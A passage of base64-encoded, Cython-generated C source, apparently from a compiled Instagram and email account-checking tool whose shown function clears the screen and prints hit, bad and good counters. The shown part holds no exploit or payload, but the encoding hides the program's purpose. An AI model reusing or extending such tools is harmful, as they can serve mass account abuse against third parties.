0ZS0+X19weXhfaW50Xzg1MDc5NDA2MzQpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMTI1NDAyOTgzNCk7XG4gIHJldHVybiAwO1xufVxuI2VuZGlmXG5cbiNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX3B5eF9tX3RyYXZlcnNlKFB5T2JqZWN0ICptLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykge1xuICBfX3B5eF9tc3RhdGV0eXBlICp0cmF2ZXJzZV9tb2R1bGVfc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtKTtcbiAgaWYgKCF0cmF2ZXJzZV9tb2R1bGVfc3RhdGUpIHJldHVybiAwO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2QpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2IpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUpO1xuICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VEXG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUpO1xuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRFxuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X0Z1c2VkRnVuY3Rpb25UeXBlKTtcbiAgI2VuZGlmXG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKTtcbiAgZm9yIChpbnQgaT0wOyBpPDE7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3NsaWNlW2ldKTsgfVxuICBmb3IgKGludCBpPTA7IGk8MjQ7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R1cGxlW2ldKTsgfVxuICBmb3IgKGludCBpPTA7IGk8MTU7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2NvZGVvYmpfdGFiW2ldKTsgfVxuICBmb3IgKGludCBpPTA7IGk8NDAwOyArK2kpIHsgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9zdHJpbmdfdGFiW2ldKTsgfVxuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8wKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzYpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE1KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzExMSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE1MCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwOCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50Xzk5OSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwMDApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMzAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAwMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDExKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxMik7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTMpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE0KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxNSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTYpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE3KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxOCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTkpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDAwMDAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEyNzkwMDEpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAxKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAxKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE5MDAwMDAwMDApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNTAwMDAwMDAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMzcxMzY2ODc4Nik7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzU2OTk3ODUyMTcpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF84NTA3OTQwNjM0KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjEyNTQwMjk4MzQpO1xuICByZXR1cm4gMDtcbn1cbiNlbmRpZlxuXG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzFwcHBwKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJqcV8xcHBwcCA9IHsicHBwcCIsIChQeUNGdW5jdGlvbilfX3B5eF9wd18yanFfMXBwcHAsIE1FVEhfTk9BUkdTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzFwcHBwKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpIHtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJwcHBwICh3cmFwcGVyKSIsIDApO1xuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1MoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICBfX3B5eF9yID0gX19weXhfcGZfMmpxX3BwcHAoX19weXhfc2VsZik7XG5cbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yanFfcHBwcChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2IgPSBOVUxMO1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2JvID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfb3V0cHV0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzNbM107XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBpbnQgX19weXhfdF84O1xuICBzaXplX3QgX19weXhfdF85O1xuICBQeU9iamVjdCAqX19weXhfdF8xMFs5XTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicHBwcCIsIDApO1xuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19weXhfdl9iID0gX19weXhfdF8xO1xuICBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9iLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fcHl4X3RfM1swXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMzhfNTtcbiAgX19weXhfdF8zWzFdID0gX19weXhfdF8xO1xuICBfX3B5eF90XzNbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbTtcbiAgX19weXhfdF8yID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8zLCAzLCA3ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xKSArIDEsIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzEpKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF92X2JvID0gKChQeU9iamVjdCopX19weXhfdF8yKTtcbiAgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25hbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gIF9fcHl4X3RfOCA9IChfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X250LCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOCA8IDApKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICBpZiAoX19weXhfdF84KSB7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbHMpO1xuICAgIF9fcHl4X3RfNCA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbHM7XG4gIH0gZWxzZSB7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGVhcik7XG4gICAgX19weXhfdF80ID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyO1xuICB9XG4gIF9fcHl4X3RfOSA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7XG4gICAgX19weXhfdF8xID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTtcbiAgICBhc3NlcnQoX19weXhfdF8xKTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF85ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEsIF9fcHl4X3RfNH07XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDExNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRpbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDExOCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTE4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZGVtYWlsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTE5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ29vZGlnKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTIwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMjAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fcHl4X3RfMTBbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1JBTURPT1RfVHJ1ZTtcbiAgX19weXhfdF8xMFsxXSA9IF9fcHl4X3RfNTtcbiAgX19weXhfdF8xMFsyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfR2VuO1xuICBfX3B5eF90XzEwWzNdID0gX19weXhfdF80O1xuICBfX3B5eF90XzEwWzRdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9CYWQ7XG4gIF9fcHl4X3RfMTBbNV0gPSBfX3B5eF90XzE7XG4gIF9fcHl4X3RfMTBbNl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X05vdDtcbiAgX19weXhfdF8xMFs3XSA9IF9fcHl4X3RfNztcbiAgX19weXhfdF8xMFs4XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfO1xuXG4gIFxuICBfX3B5eF90XzIgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzEwLCA5LCAyMCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSkgKyA3ICogMyArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNCkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weX